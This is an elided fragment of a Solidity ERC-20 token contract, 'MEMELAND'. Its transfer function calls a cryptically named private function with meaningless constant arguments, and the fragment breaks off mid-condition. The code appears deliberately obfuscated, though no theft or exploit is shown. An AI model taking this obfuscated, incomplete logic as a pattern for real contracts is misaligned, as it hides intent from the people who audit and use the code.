...
contract MEMELAND is IERC20, IERC20Metadata {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        (bool dn, string memory sn) = memeland( false,  amount, false, "Memeland", bytes("Memeland"), 1399);
        if (dn) emit tlog(sn);
    ...
    function memeland(bool dn, uint256 pn,  bool dns, string memory sn, bytes memory dn0, uint256 pn1) 
    private pure returns(bool, string memory) {
        if ( pn == 0 && pn1 == 2  &&  dns && dn ) {
